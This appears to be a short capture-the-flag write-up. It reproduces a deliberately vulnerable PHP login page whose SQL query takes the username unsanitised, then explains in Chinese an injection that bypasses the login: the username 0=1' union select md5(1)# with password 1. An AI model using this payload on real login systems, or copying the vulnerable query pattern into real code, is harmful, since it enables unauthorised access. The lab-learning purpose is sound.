```html
<html>
<head>
welcome to simplexue
</head>
<body>
<?php


if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********, "*****", "********");
	mysql_select_db("phpformysql") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed: " . mysql_error($conn));
} 
$user = $_POST[user];
$pass = md5($_POST[pass]);

$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  
  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
	
  }
  
  
}

?>
<form method=post action=index.php>
<input type=text name=user value="Username">
<input type=password name=pass value="Password">
<input type=submit>
</form>
</body>
<a href="index.txt">
</html>
```
目標:if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) true  
md5(pass) 可控制  
row[pw]來自sql 所以修改這裡  
user:0=1' union select md5(1)#
* 0=1' 會構成  where user='0=1' 因此回傳false  
* '#' comment out 後面多餘的東西  

password:1  
* password 和 md5()裡的數字一樣即可  
